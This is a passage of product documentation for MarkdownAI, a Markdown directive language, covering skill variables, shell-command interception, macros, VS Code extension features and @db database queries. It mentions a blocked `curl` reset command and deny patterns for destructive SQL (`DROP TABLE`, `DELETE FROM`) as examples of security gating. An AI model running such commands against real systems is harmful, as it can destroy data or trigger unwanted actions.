```

81% reduction for this section. Claude doesn't read about what to do - the document does it first.

<!-- /mdd-section: 46-mdd-token-optimization-analysis -->

<!-- mdd-section: 47-skill-context-variables -->
### Skill Context Variables — Claude Code Slash Command Integration

When a MarkdownAI document is executed as a Claude Code skill via the MCP `read_file` tool, the full slash command invocation context is available as first-class variables inside `@if` conditions and `{{ }}` interpolations. This enables genuine engine-evaluated dispatch in skill files - the document routes itself based on arguments, rather than embedding prose instructions for Claude to interpret.

#### What It Does

Claude Code passes several variables when invoking a skill: the argument string, the individual positional args, named args declared in the skill frontmatter, the session ID, the effort level, and the skill directory. MarkdownAI exposes all of these in the expression sandbox.

**Available variables in `@if` and `{{ }}`:**

| Variable | Description |
|----------|-------------|
| `ARGUMENTS` or `args` | Full raw argument string from `$ARGUMENTS` |
| `argsList` | Positional args, shell-style parsed (quoted strings kept together) |
| `arg0` `arg1` `arg2` `arg3` | Shorthand for `argsList[0]` through `argsList[3]` |
| `CLAUDE_EFFORT` | Effort level: `low`, `medium`, `high`, `xhigh`, or `max` |
| `CLAUDE_SESSION_ID` | Unique ID for the current Claude Code session |
| `CLAUDE_SKILL_DIR` | Directory containing the skill file |
| Named arg keys | Spread into root scope from skill frontmatter `arguments:` list |

The preprocessor also handles `$ARGUMENTS`, `$ARGUMENTS[N]`, and `$N` (single digit) as aliases, so Claude Code-style syntax works directly in expressions.

#### How To Use It

Dispatch to different behavior based on arguments:

```markdown
@markdownai

@if ARGUMENTS.startsWith("audit")
  @include ./audit-mode.md
@elseif ARGUMENTS.startsWith("build")
  @include ./build-mode.md
@endif
```

Show extra content only for high-effort sessions:

```markdown
@if CLAUDE_EFFORT == "max"
  @include ./extended-analysis.md
@endif
```

Use named args declared in skill frontmatter (e.g., `arguments: [issue, branch]`):

```markdown
@if issue !== ""
Working on issue: {{ issue }}
@endif
```

#### `@query` vs Claude Code's `!`command`` Syntax

Claude Code skill files support a native shell injection syntax, `` !`command` ``, that runs commands before Claude sees the file. MarkdownAI's `@query` covers the same use case with full security gating.

| Control | `@query` | `` !`command` `` (Claude Code) |
|---------|----------|-------------------------------|
| Disabled by default | Yes - `allowShell: false` | No - always runs |
| Command allowlist | Yes | No |
| Deny patterns | Yes | No |
| Filesystem jail | Yes - `jailRoot` confinement | No |
| Immutable block rules | Yes | No |
| Audit log | Yes | No |
| Works outside Claude Code | Yes | No |
| Named output for reuse | Yes - `label=varname` | No - inline only |

`@query` also stores results in a named label, making the output reusable throughout the document and in `@if` conditions. The native `` !`command` `` injects inline only - no label, no conditions, no reuse.

<!-- /mdd-section: 47-skill-context-variables -->

<!-- mdd-section: 48-shell-inline -->
### Shell Inline - Native Command Interception

Claude Code skill files support a native shell injection syntax: `` !`command` ``. When Claude reads a file, it runs any `` !`command` `` tags and injects the output inline - before any other processing happens. There are no gates, no allowlist, no jail. In a plain skill file, `` !`git branch --show-current` `` just runs.

When a document opens with `@markdownai`, that changes. MarkdownAI intercepts all `` !`command` `` patterns and routes them through the same security layer that governs `@query`. The parser emits a `ShellInlineNode`; the engine decides whether to run it.

**Default behavior: blocked**

With `allowShell: false` (the default), every `` !`command` `` tag is blocked. The engine emits a warning and replaces the tag with nothing:

```
Shell inline blocked: allowShell is false
```

This means a skill file or runbook that contains `` !`make build` `` or `` !`curl http://internal-api/reset` `` will not silently execute those commands just because someone opens the document. The document author has to explicitly enable shell execution.

**When allowShell is true**

With `allowShell: true`, `` !`command` `` runs - but through the same deny-pattern check and `jailRoot` confinement that `@query` uses. The output replaces the tag inline at the point it appears. There is no label, no stored result, and no way to reference the output in an `@if` condition later. It is purely inline substitution.

```
Current branch: !`git branch --show-current`
Files changed: !`git diff --stat | wc -l`
```

Both `@query` and `` !`command` `` can appear in the same document without conflict.

**Opting out with passthrough**

If you want Claude Code's native `` !`command` `` behavior - no gating, runs immediately on read - add this to the document header:

```
@markdownai shell-inline="passthrough"
```

The option is called `passthrough`, not `disable`. That naming is intentional: you are explicitly handing control back to Claude Code, not turning off a feature. MarkdownAI passes the raw tag through unchanged and takes no responsibility for what runs.

Passthrough makes sense for personal skill files you control entirely, where Claude Code's native evaluation is exactly what you want and adding a security layer would just get in the way.

**Why this matters for runbooks and shared skill files**

Runbooks and skill files are often shared across a team or checked into a repo. A file that contains `` !`command` `` syntax can run arbitrary commands on whatever machine opens it. Without interception, there is no review step - the command runs before Claude even sees the document content.

MarkdownAI's interception means shared `.md` files in a `@markdownai` project get the same scrutiny as any other shell execution.

| Property | `@query` | `` !`command` `` via MarkdownAI | `` !`command` `` via Claude Code |
|---|---|---|---|
| Disabled by default | Yes | Yes | No - always runs |
| Command allowlist | Yes | Yes (same gates) | No |
| Deny patterns | Yes | Yes (same gates) | No |
| Filesystem jail | Yes | Yes (same jailRoot) | No |
| Immutable block rules | Yes | Yes | No |
| User can opt out | No | Yes (passthrough) | N/A |

<!-- /mdd-section: 48-shell-inline -->

<!-- mdd-section: 49-stdlib -->
### Standard Library (stdlib)

The standard library gives every MarkdownAI document a ready-made set of 32 macros for common tasks - git queries, filesystem checks, project detection, and more. No setup required: write `@call git-branch` and it works.

#### What It Does

The stdlib auto-loads when the engine starts, so every document marked `@markdownai` has immediate access to all 32 macros. Calling a macro runs the underlying operation - a git command, a file scan, an environment check - and stores the result in a template variable you can use anywhere in the document. Macros that could produce large output are capped automatically so documents stay readable. If you define a macro with the same name yourself, your version wins.

The 32 macros are grouped into five areas:

- **Git operations (9):** branch, status, log, diff stats, staged files, modified files, untracked files, commits ahead of remote, last commit message
- **Filesystem (7):** directory listing, file search by pattern, large files, recently changed files, tree view, file count by extension, directory size
- **Project detection (5):** package manager, primary language, project name, version, test command
- **Code analysis (5):** TODO comments, console.log calls, TypeScript `any` types, test file locations, arbitrary grep
- **Environment (6):** Node version, OS, port availability check, command existence check, CI detection, git author

#### How To Use It

1. Open any `.md` file that starts with `@markdownai v1.0`.
2. Add an `@call` directive anywhere in the document, using the macro name.
3. Reference the result with `{{ variable_name }}` in surrounding text or inside `@if` conditions.
4. Render the document with `mai render <file>` - the engine resolves all calls and substitutes values.

**Macro syntax:**

```markdown
@call <macro-name>
```

Some macros accept a parameter:

```markdown
@call fs-find(*.ts)
@call env-port(3000)
@call fs-count(ts)
@call code-grep(TODO)
```

To override a stdlib macro, define your own `@define` with the same name. Your definition takes precedence.

#### Examples

**Show current branch and project manager:**

```markdown
@call git-branch
@call project-manager

Working on: {{ current_branch }}
Package manager: {{ pkg_manager }}
```

**Check for TypeScript `any` usage:**

```markdown
@call code-any-types

TypeScript any count: {{ any_count }}
```

**Use git status in a conditional:**

```markdown
@call git-modified

@if {{ modified_files }} != ""
> Warning: you have uncommitted changes.
@endif
```

<!-- /mdd-section: 49-stdlib -->

<!-- mdd-section: 50-match-operator -->
### match Operator - Regex Matching in Expressions

The `match` operator lets you test a value against a regex pattern directly inside `@if` conditions, inline interpolations, and filter clauses. It removes the need to write raw JavaScript regex syntax in your documents.

#### What It Does

`match` is an infix operator in the MarkdownAI expression system. You place it between a value (an environment variable, a dotted path like `env.BRANCH`, or a `{{ }}` interpolation) and a quoted pattern string. MarkdownAI compiles the pattern into a regular expression at render time and evaluates whether it matches. The result is a boolean - `true` or `false` - which drives conditional blocks, inline output, or list filters depending on where you use it.

#### How To Use It

**Syntax:**
```
<value> match "<pattern>"
```

- `<value>` - an env var name, a dotted path (`env.BRANCH`), or a `{{ }}` interpolation
- `"<pattern>"` - a regex pattern string without surrounding slashes

**Where you can use it:**

1. **In `@if` conditions** - controls whether a block renders
   ```markdown
   @if {{ current_branch }} match "^feat"
   Content shown only on feature branches.
   @endif
   ```

2. **In inline interpolations** - outputs `true` or `false` in text
   ```markdown
   On feature branch: {{ current_branch match "^feat" }}
   ```

3. **In `where` clauses** on `@list`, `@read`, and `@db` - filters items by pattern match

**Negation** - prefix with `!` to invert the match:
```markdown
@if !({{ current_branch }} match "^feat")
Not a feature branch.
@endif
```

#### Examples

**Guard a workflow to feature branches only:**
```markdown
@call git-branch
@if {{ current_branch }} match "^feat"
This is a feature branch - proceed with feature workflow.
@endif
```

**Warn when working directly on main:**
```markdown
@if {{ current_branch }} match "^(main|master)$"
@constraint You are on the main branch. Create a feature branch before making changes.
@endif
```

**Show branch type inline:**
```markdown
Is feature branch: {{ current_branch match "^feat" }}
```

<!-- /mdd-section: 50-match-operator -->

<!-- mdd-section: 51-package-scaffold -->
### VS Code Extension - Package Scaffold

The MarkdownAI VS Code extension package provides the foundation that all editor features build on. It registers the extension with VS Code and exports the activation hooks that subsequent features populate.

#### What It Does

This package sets up the `@markdownai/vscode` extension as a member of the monorepo. It wires up the two entry points VS Code requires - `activate()` and `deactivate()` - so that subsequent features (language detection, syntax highlighting, snippets, completions) can register their behavior in a consistent place. The extension loads when VS Code finishes starting up, which means it is ready before you open your first file. Minimum VS Code version required is 1.85.

#### How To Use It

The scaffold itself has no user-facing commands or settings. You interact with it by installing the extension and then using the features built on top of it. To build from source:

1. Navigate to the monorepo root.
2. Run `npm install` to install all workspace dependencies.
3. Run `npm run build --workspace=packages/vscode` to compile the extension.
4. In VS Code, press F5 inside the `packages/vscode` folder to launch a development host window.

#### Examples

```bash
# Build only the VS Code package
npm run build --workspace=packages/vscode
```

<!-- /mdd-section: 51-package-scaffold -->

<!-- mdd-section: 52-language-definition -->
### VS Code Extension - Language Definition and Detection

MarkdownAI files are plain `.md` files with a special header, so VS Code cannot tell them apart from ordinary markdown by filename alone. This feature solves that by checking file content at open time and switching the language mode automatically - so every other editor feature activates exactly when it should.

#### What It Does

When you open any `.md` file whose very first line is `@markdownai`, the extension detects it and switches that document's language to `markdownai`. This detection runs on files that are already open when VS Code starts, and on every file you open afterward. The language switch is what triggers grammar highlighting, snippet suggestions, and completions to activate. Files that do not start with `@markdownai` stay in standard markdown mode.

#### How To Use It

Detection is automatic once the extension is installed. No settings to configure.

1. Open any `.md` file in VS Code.
2. Make sure the very first line (no leading spaces) is exactly `@markdownai`.
3. The language mode indicator in the status bar switches from "Markdown" to "MarkdownAI".
4. If the file was already open before the extension activated, the switch still happens.

Two things to watch:
- The match is case-sensitive. `@MarkdownAI` or `@markdownai ` (trailing space) will not trigger detection.
- If a document is already set to `markdownai` language, the extension skips it to avoid redundant processing.

#### Examples

A file that triggers detection (first line is the header):
```markdown
@markdownai v1.0

## My Document

@env DATABASE_URL
```

A file that does NOT trigger detection (header is not the first line):
```markdown
## My Document

@markdownai v1.0
```

<!-- /mdd-section: 52-language-definition -->

<!-- mdd-section: 53-syntax-highlighting -->
### VS Code Extension - Syntax Highlighting

MarkdownAI files mix directive syntax with standard markdown, and without highlighting the two blur together. This feature gives every MarkdownAI construct its own color so you can read a document at a glance without mentally parsing the syntax.

#### What It Does

The extension registers a language grammar for MarkdownAI files. It colors directive keywords (like `@env`, `@if`, `@include`), `{{ expression }}` interpolations, named parameters like `label=` or `ext=`, and the `@markdownai` header line - each in a distinct scope that your color theme can style. Everything that is not a MarkdownAI construct falls through to standard markdown highlighting, so headings, bold text, lists, and code fences all look the same as in any other markdown file.

All directive keywords are covered: `import`, `include`, `define`, `enddefine`, `call`, `env`, `if`, `elseif`, `else`, `endif`, `query`, `list`, `read`, `http`, `db`, `connect`, `tree`, `date`, `count`, `render`, `phase`, `on`, `graph`, `prompt`, `constraint`, `cache`, and `match`.

#### How To Use It

Highlighting activates automatically when a file is detected as MarkdownAI. No configuration needed.

If your color theme does not style MarkdownAI scopes distinctly, add token color overrides in VS Code `settings.json` under `editor.tokenColorCustomizations`.

<!-- /mdd-section: 53-syntax-highlighting -->

<!-- mdd-section: 54-snippets -->
### VS Code Extension - MarkdownAI Snippets

Remembering the exact syntax for multi-line directives like `@define...@enddefine` or `@if...@endif` slows you down and leads to typos. Snippets let you type a short prefix, press Tab, and get a correctly structured template with your cursor already in the right place.

#### What It Does

The extension ships a snippet for every commonly-used MarkdownAI directive. Each snippet expands to the full directive structure - including closing tags where needed - and uses tab stops so you can jump between the parts that need your input. The header snippet (`mai`) gives you the `@markdownai` line needed to activate the language on any new document.

#### How To Use It

1. Open a `.md` file with MarkdownAI highlighting active.
2. Type the snippet prefix.
3. Press **Tab** to expand the snippet.
4. Fill in the first placeholder, then press **Tab** again to move to the next one.

Available snippets:

| Prefix | Expands to |
|--------|-----------|
| `mai` | `@markdownai` header |
| `@import` | `@import ./path.md` |
| `@include` | `@include ./path.md` |
| `@define` | Full `@define name ... @enddefine` block |
| `@call` | `@call macro-name` |
| `@env` | `@env VAR_NAME` |
| `@if` | Full `@if ... @endif` block |
| `@ifelse` | Full `@if ... @else ... @endif` block |
| `@query` | `@query label=result command` |
| `@http` | `@http https://...` |
| `@list` | `@list from=./data.json` |
| `@read` | `@read ./file.txt` |
| `{{` | `{{ variable }}` |
| `@prompt` | `@prompt` block |
| `@constraint` | `@constraint description` |
| `@define-concept` | `@define-concept Name\nDefinition.` |

#### Examples

Typing `@define` and pressing Tab expands to:
```markdown
@define name param
...
@enddefine
```
Your cursor lands on `name`, then tabs to `param`, then to the body.

Typing `{{` and pressing Tab expands to `{{ variable }}` with the cursor on `variable`.

<!-- /mdd-section: 54-snippets -->

<!-- mdd-section: 55-completion-provider -->
### VS Code Extension - Completion Provider

When you type `@call ` in a MarkdownAI document, an IntelliSense popup lists every available macro. This saves you from memorizing macro names and shows you what each one does before you commit to using it.

#### What It Does

The completion provider scans three sources for macros: the 32 built-in stdlib macros (things like `git-status`, `git-branch`, and `fs-ls`), any `@define` blocks in the current file, and macros from files pulled in with `@import`. Each item in the popup shows the macro name, the label variable it writes to (so you know how to reference the output), and a short description of what the macro does. Your own macros appear first, imported macros second, and stdlib macros last.

#### How To Use It

1. Open any `.md` file that starts with `@markdownai`.
2. Type `@call ` (include the space after `call`).
3. The IntelliSense popup appears automatically.
4. Browse the list and select a macro with Enter or Tab.

#### Examples

Typing `@call ` shows a popup item for `git-branch`:
```
git-branch   → {{ current_branch }}
Returns the active git branch name.
```

Typing `@call git` narrows the list to macros whose names start with `git`.

<!-- /mdd-section: 55-completion-provider -->

<!-- mdd-section: 56-hover-provider -->
### VS Code Extension - Hover Provider

Hovering over a macro name in a MarkdownAI document shows an inline tooltip with the macro's description, what variable it sets, and where it comes from. You get the documentation you need without switching windows.

#### What It Does

The hover provider activates whenever your cursor rests on a line containing `@call macro-name` or `@define macro-name`. It looks up that macro across stdlib, the current file, and any imported files, then displays a small formatted card. The card shows the macro name, whether it comes from stdlib, a local `@define`, or an imported file, the label variable the macro writes its output to, and a plain-English description of what it does. If the macro is not found anywhere, no tooltip appears.

#### How To Use It

1. Open any `.md` file that starts with `@markdownai`.
2. Find a line with `@call` or `@define` followed by a macro name.
3. Hover your cursor anywhere on that line.
4. The tooltip appears after VS Code's normal hover delay.

#### Examples

Hovering over `@call git-status` shows:
```
**git-status** (stdlib)
- sets `{{ git_status }}`

Compact working tree status.
```

Hovering over a custom `@define summarize-errors` in the same file:
```
**summarize-errors** (local)
- sets `{{ summary }}`

Your description from the @define comment block.
```

<!-- /mdd-section: 56-hover-provider -->

<!-- mdd-section: 57-definition-provider -->
### Go-To-Definition for Macros

Press Cmd+Click (Mac) or F12 on any `@call macro-name` line to jump directly to where that macro is defined. This works whether the macro lives in the same file, an imported file, or the MarkdownAI standard library.

#### What It Does

When you're reading or editing a MarkdownAI document, macros can be defined anywhere - in the current file, in a file you've imported with `@import`, or in the built-in stdlib. This feature lets you navigate to the definition instantly, just like jumping to a function definition in a programming language. If the macro can't be found, nothing happens - no error, just no navigation.

#### How To Use It

1. Open any MarkdownAI document in VS Code.
2. Find a line that calls a macro - it will look like `@call macro-name`.
3. Hold Cmd (Mac) or Ctrl (Windows/Linux) and click anywhere on that line, or press F12 with your cursor on the line.
4. VS Code jumps to the `@define macro-name` block where that macro is declared.
5. If the macro is defined in a different file, VS Code opens that file automatically and positions you at the definition.

<!-- /mdd-section: 57-definition-provider -->

<!-- mdd-section: 58-reference-panel -->
### Find All References for Macros

Press Shift+F12 on any `@call macro-name` or `@define macro-name` line to see every place that macro is used in the current document. The results appear in VS Code's standard References panel.

#### What It Does

When you want to know everywhere a macro is called before renaming or changing it, this feature gives you a complete list. It scans the current document for all `@call` occurrences of that macro and includes the `@define` location if the macro is defined locally. Note that the search covers the current file only.

#### How To Use It

1. Open a MarkdownAI document in VS Code.
2. Place your cursor on any line containing `@call macro-name` or `@define macro-name`.
3. Press Shift+F12.
4. The References panel opens showing every location where that macro appears.
5. Click any result in the panel to jump to that line.

<!-- /mdd-section: 58-reference-panel -->

<!-- mdd-section: 59-diagnostics-provider -->
### VS Code Extension - Diagnostics

The extension watches your MarkdownAI documents for structural problems and highlights them inline, the same way a linter would. You don't need to run anything - errors and warnings appear as you type.

**What you'll see**

Red squiggly underlines mark structural errors - blocks that were opened but never closed. If you write `@if`, `@define`, or `@phase` and reach the end of the file without the matching `@endif` or `@end`, the opening line gets flagged. All open blocks are reported, not just the first one.

Yellow squiggly underlines mark unknown macro references. If you call a macro with `@call myMacro` and `myMacro` isn't defined anywhere in scope, the macro name gets a warning. The underline covers just the name, not the whole line.

**What triggers an error**

- `@if` without a matching `@endif`
- `@define <name>` without a matching `@end`
- `@phase <name>` without a matching `@end`
- Any combination of the above left open at end-of-document

Nested blocks work fine - `@elseif` and `@else` inside an `@if` are valid and don't produce diagnostics.

**What triggers a warning**

- `@call someMacro` where `someMacro` isn't in the local document or the standard library

Macros prefixed with `stdlib:` are always considered known, so you won't see warnings for built-in references.

**What doesn't get analyzed**

Diagnostics only run on files the extension recognizes as MarkdownAI documents - those with a `@markdownai` header and the `markdownai` language ID. Plain `.md` files are never touched.

<!-- /mdd-section: 59-diagnostics-provider -->

<!-- mdd-section: 60-extension-settings -->
### Extension Settings

Extension Settings give you control over how the MarkdownAI extension behaves in VS Code. You can turn off diagnostics entirely, silence undefined-macro warnings while keeping structural checks, or point the extension at a custom stdlib file.

#### What It Does

The extension registers a set of configuration options under the `markdownai` namespace. These options let you tune the Diagnostics Provider and tell the extension where to find your stdlib macro definitions.

#### How To Use It

1. Open VS Code Settings with `Cmd+,` (macOS) or `Ctrl+,` (Windows/Linux).
2. Search for `markdownai`.
3. Update the setting. Changes take effect on the next document open or edit - no restart needed.

#### Configuration

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `markdownai.diagnostics.enabled` | boolean | `true` | Set to `false` to turn off all diagnostics and clear existing underlines |
| `markdownai.diagnostics.warnUndefinedMacros` | boolean | `true` | Set to `false` to skip macro reference checks; structural errors still reported |
| `markdownai.stdlibPath` | string | `"packages/engine/src/stdlib.md"` | Path to stdlib macro definitions, relative to workspace root |

<!-- /mdd-section: 60-extension-settings -->

<!-- mdd-section: 61-test-suite -->
### Extension Test Suite

The MarkdownAI VS Code extension ships with a full automated test suite that verifies every major feature. All 79 tests run in under a second without needing a running VS Code instance or a display server.

#### What It Does

The test suite covers autocomplete, hover documentation, diagnostics, go-to-definition, reference finding, language detection, snippet content, grammar token scopes, and settings behavior. Rather than testing against the VS Code API directly, the suite targets pure analysis modules - so tests are fast, reliable, and run in any environment including CI.

#### How To Use It

```bash
cd packages/vscode
npm test
```

All 9 test files run automatically. If a test fails, the output names the specific check and the module it tests.

<!-- /mdd-section: 61-test-suite -->

<!-- mdd-section: 62-readme-and-marketplace -->
### README and Marketplace Metadata

The extension README is the first thing users see in the VS Code Marketplace and the Extensions panel. This feature covers all the content and metadata that make the extension discoverable and easy to understand before install.

#### What It Does

The README explains what MarkdownAI is, lists every feature the extension provides, and documents all available settings with their defaults. The extension's `package.json` also includes the publisher metadata required to build a `.vsix` package with `vsce package`.

#### How To Use It

1. Install the extension from the VS Code Marketplace or by opening a `.vsix` file.
2. Open any `.md` file that starts with `@markdownai` on the first line.
3. All features activate automatically - no manual setup required.
4. Adjust behavior via VS Code Settings by searching for `markdownai`.

<!-- /mdd-section: 62-readme-and-marketplace -->

<!-- mdd-section: 63-db-query-language -->
### @db Directive - Query Language

The `@db` directive runs a database query and returns rows as output you can pipe into other directives. It works with MongoDB, Postgres, MySQL, SQL Server, and SQLite - and a document written for one database looks identical when pointed at another.

#### What It Does

`@db` connects to a database, runs one of five operations (find, one, count, aggregate, or raw), and passes typed rows downstream. The query language is database-agnostic, so if your team switches databases, the document stays the same. Because this directive accesses live data, it is disabled by default and must be explicitly enabled in your security configuration.

#### How To Use It

1. Enable `@db` in `~/.markdownai/security.json`.
2. Set up a named connection using `@connect`, or prepare an environment variable holding your connection string.
3. Add an `@db` directive with exactly one operation.
4. Pipe the output into `@render` or another directive to format results.

**Five operations - pick exactly one per directive:**

| Operation | What It Does |
|-----------|--------------|
| `find="collection"` | Returns multiple rows matching your filter |
| `one="collection"` | Returns the first matching row |
| `count="collection"` | Returns a row count |
| `aggregate="collection"` | Groups and summarizes rows |
| `raw="SQL string"` | Runs a raw SQL statement (read-only) |

**Common options:**

| Option | Applies To | Description |
|--------|------------|-------------|
| `using="name"` | All | Named connection from `@connect` registry |
| `uri=env.VAR` | All | Inline connection string from an environment variable |
| `where="expression"` | find, one, count, aggregate | Filter condition |
| `sort="field:asc"` | find, one | Sort order |
| `limit=N` | find | Maximum rows to return |
| `columns="field:Label,..."` | find, one, aggregate | Select and rename output fields |
| `group="field"` | aggregate | Group rows by this field |
| `count=true` | aggregate | Count rows per group |
| `sum="field"` | aggregate | Sum a numeric field per group |
| `avg="field"` | aggregate | Average a numeric field per group |
| `as="table"` | All | Shorthand for `\| @render type="table"` |
| `@cache` | All | Cache the result - always the last token |

#### Examples

Return all active users as a table:
```markdown
@db using="primary" find="users" where="active==true" | @render type="table"
```

Look up a single record by environment variable:
```markdown
@db using="primary" one="users" where="email==env.ADMIN_EMAIL"
```

Count pending orders:
```markdown
@db using="primary" count="orders" where="status==pending"
```

Summarize orders by status:
```markdown
@db using="primary" aggregate="orders" group="status" count=true | @render type="bar"
```

<!-- /mdd-section: 63-db-query-language -->

<!-- mdd-section: 64-db-where-clause -->
### @db where Clause

The `where=` option filters what rows a `@db` directive returns. It uses the same expression system as the rest of MarkdownAI, so you can reference environment variables, combine conditions with AND and OR, and group sub-expressions with parentheses.

#### What It Does

When you add `where=` to a `@db` directive, MarkdownAI evaluates the expression before the query runs. On MongoDB, the filter becomes a native server-side query. On SQL databases, MarkdownAI fetches rows and applies the filter in memory - so for large SQL datasets, a `raw=` query with a native WHERE clause performs better. Environment variable references are resolved before anything is sent to the database.

#### How To Use It

Write the `where=` value as a string expression:

| Operator | Meaning |
|----------|---------|
| `==` | Equal |
| `!=` | Not equal |
| `>` / `<` | Greater / less than |
| `>=` / `<=` | Greater or equal / less or equal |
| `&&` | AND |
| `\|\|` | OR |
| `( )` | Grouping |

MarkdownAI automatically infers value types: `true`/`false` become booleans, numeric strings become numbers, `null` becomes null, `env.VAR` is resolved from the environment.

#### Examples

Filter by boolean:
```markdown
@db using="primary" find="users" where="active==true"
```

Filter with an environment variable:
```markdown
@db using="primary" one="users" where="id==env.TARGET_USER_ID"
```

Combine conditions:
```markdown
@db using="primary" find="users" where="active==true && role==admin"
```

Group sub-expressions:
```markdown
@db using="primary" find="users" where="(role==admin || role==editor) && active==true"
```

<!-- /mdd-section: 64-db-where-clause -->

<!-- mdd-section: 65-db-aggregate-operation -->
### @db aggregate Operation

The aggregate operation groups database rows by a field and computes summary values for each group. Use it to answer questions like "how many orders per status?" or "what is the total revenue by region?" directly in your document.

#### What It Does

When you query a collection with `aggregate=`, MarkdownAI groups every row by the field you specify in `group=`, then computes whichever summary values you ask for - counts, sums, averages, minimums, or maximums. The result comes back as a flat table with one row per group, ready to pipe into a chart or table renderer. You can combine multiple aggregation functions on a single directive, and you can filter rows with `where=` before grouping happens.

#### How To Use It

1. Add `aggregate="<collection>"` as the operation.
2. Add `group="<field>"` - required.
3. Add at least one aggregation function:
   - `count=true` - rows per group (output column: `count`)
   - `sum="<field>"` - sum per group (output column: `sum_<field>`)
   - `avg="<field>"` - average per group (output column: `avg_<field>`)
   - `min="<field>"` / `max="<field>"` - min/max per group
4. Optionally add `where=` to filter rows before grouping, or `columns=` to rename output columns.
5. Pipe to `@render` to display.

#### Examples

Count orders by status as a bar chart:
```markdown
@db using="primary" aggregate="orders" group="status" count=true | @render type="bar"
```

Sum revenue by region:
```markdown
@db using="primary" aggregate="orders" group="region" sum="amount" | @render type="table"
```

Multiple aggregations with a date filter:
```markdown
@db using="primary" aggregate="orders" group="status" count=true sum="amount" avg="amount" where="createdAt>2025-01-01" | @render type="table"
```

Output shape:
```
status    | count | sum_amount | avg_amount
----------|-------|------------|----------
pending   | 142   | 28400.00   | 200.00
complete  | 1203  | 240600.00  | 200.00
```

<!-- /mdd-section: 65-db-aggregate-operation -->

<!-- mdd-section: 66-db-raw-escape-hatch -->
### @db raw= Escape Hatch

The `raw=` option lets you pass a native query string directly to your database, bypassing the structured `@db` query syntax. Use it for queries that cannot be expressed in structured form - complex joins, window functions, CTEs, or full aggregation pipelines.

#### What It Does

Every `@db` directive normally uses structured options (`find=`, `aggregate=`, `where=`, etc.) to build queries in a controlled way. The `raw=` escape hatch hands your string straight to the database adapter, giving you the full power of the underlying query language. Because this bypasses the structured layer, it carries extra requirements: you must opt in per connection via your security config, every execution writes a warning to the audit log, and write patterns are still blocked by MarkdownAI's immutable rules regardless. Raw queries are never cached by default - add `@cache` explicitly if you need caching.

#### How To Use It

1. Set `allow_raw: true` in `~/.markdownai/security.json` for the named connection. Without this, the directive is stripped with a warning.
2. Write your directive with `raw="<native query string>"`.
3. Pipe to `@render` as usual.
4. Add `@cache` explicitly if you want caching.

Keep in mind:
- `raw=` cannot be combined with `find=`, `one=`, `count=`, or `aggregate=`.
- Every execution appends a WARN to the audit log. This cannot be suppressed.
- Patterns like `DROP TABLE` and `DELETE FROM` raise SECURITY_ALERT and halt the document, even with `allow_raw: true`.

#### Examples

Join users to their orders, count per user:
```markdown
@db using="primary" raw="SELECT u.name, COUNT(o.id) as orders FROM users u LEFT JOIN orders o ON u.id = o.user_id WHERE u.active = true GROUP BY u.id ORDER BY orders DESC LIMIT 10" | @render type="table"
```

<!-- /mdd-section: 66-db-raw-escape-hatch -->

<!-- mdd-section: 67-db-queryplan-types -->
### DB - QueryPlan Type System

The QueryPlan type system is the intermediate representation that sits between the `@db` directive parser and the database adapters. The parser produces a QueryPlan, every adapter consumes one, and this contract is what makes the database-agnostic directive syntax possible.

#### What It Does

QueryPlan defines a fixed set of TypeScript types that describe any supported query in a normalized, adapter-neutral form. The core types cover operations (`find`, `one`, `count`, `aggregate`), filter conditions with resolved primitive values, sort terms, column mappings, and aggregate functions. The `Row` type restricts values to primitives and null - no nested objects, arrays, or Date instances pass through. This strict boundary keeps adapters simple and output predictable. Raw queries bypass the QueryPlan entirely and are handled through a separate code path.

#### How To Use It

When writing a new adapter, implement `execute(plan: QueryPlan)` - you receive a fully resolved plan with no env tokens or unevaluated expressions. When extending the parser, produce a QueryPlan with all `Filter.value` fields resolved to typed primitives before emitting. Never add `"raw"` as an operation type - raw routing is handled outside the QueryPlan flow.

<!-- /mdd-section: 67-db-queryplan-types -->

<!-- mdd-section: 68-db-executor -->
### DB - Executor

The executor is the bridge between the query parser and the adapter layer. It parses `@db` directive options into a QueryPlan, routes to the correct adapter by connection type, handles security checks for raw queries, and returns normalized rows.

#### What It Does

The executor splits into two modules. The parsing module takes raw `@db` options, resolves all `env.VAR` tokens, infers value types, parses where clauses, and produces a QueryPlan. The routing module receives that QueryPlan, looks up the adapter by connection type string, and calls the adapter's `execute` method. For raw queries, it checks `allow_raw` first - if false, the directive is stripped with a WARN; if true, an unconditional WARN is written to the audit log before execution. Connection lifecycle: the MCP server connects at startup and holds connections open; the CLI connects on demand and disconnects after each command.

#### How To Use It

To add support for a new database: create one adapter file implementing DbAdapter, add the type string to the `supported_types` list in the executor module. No other changes needed. The executor handles all routing and security checks automatically.

<!-- /mdd-section: 68-db-executor -->

<!-- mdd-section: 69-db-adapter-interface -->
### DB - DbAdapter Interface

The DbAdapter interface is the contract every database adapter must implement. It defines five methods covering connection management, query execution, raw query passthrough, health checks, and clean teardown.

#### What It Does

Any new adapter must implement: `connect(uri)` to open the connection, `execute(plan)` to translate a QueryPlan to a native query and return typed rows, `executeRaw(query)` to pass a query string directly to the driver, `disconnect()` to close the connection safely, and `ping()` to check connection health without throwing. Two hard constraints apply: `execute()` must use parameterized queries (never string-concatenate filter values), and all returned Row values must be primitives - strings, numbers, booleans, or null. Adapters handle connection pooling internally.

#### How To Use It

Create a single file implementing DbAdapter. Implement all five methods. Add one type string to the supported_types list. Nothing else in the codebase changes. Test `execute()` by constructing a QueryPlan directly from the types module - you don't need to run the full parser pipeline.

<!-- /mdd-section: 69-db-adapter-interface -->

<!-- mdd-section: 70-db-mongodb-adapter -->
### DB - MongoDB Adapter

The MongoDB adapter implements DbAdapter using the native mongodb driver (no Mongoose). It translates QueryPlan operations into MongoDB driver calls and returns flattened primitive rows.

#### What It Does

Each QueryPlan operation maps to a specific driver call: `find` runs `collection.find()` with filter, projection, sort, and limit; `one` runs `collection.findOne()`; `count` uses `collection.countDocuments()`; `aggregate` builds a `$group` pipeline from AggregateOp definitions; `raw` passes a pipeline or query string straight to the driver. AND-chained filters become plain filter objects; OR-chained filters become `$or` arrays. Column maps become projections with `_id` excluded by default. Boolean filter values pass through without coercion - MongoDB handles them natively. ObjectId values are coerced to strings before returning. Connection pooling is handled by MongoClient internally.

<!-- /mdd-section: 70-db-mongodb-adapter -->

<!-- mdd-section: 71-db-sql-adapters -->
### DB - SQL Adapters (PostgreSQL, MySQL, MSSQL, SQLite)

Four SQL adapters let `@db` directives query relational databases. Each adapter translates the standard `@db` query syntax into parameterized SQL for its target engine - PostgreSQL, MySQL, SQL Server, or SQLite.

#### What It Does

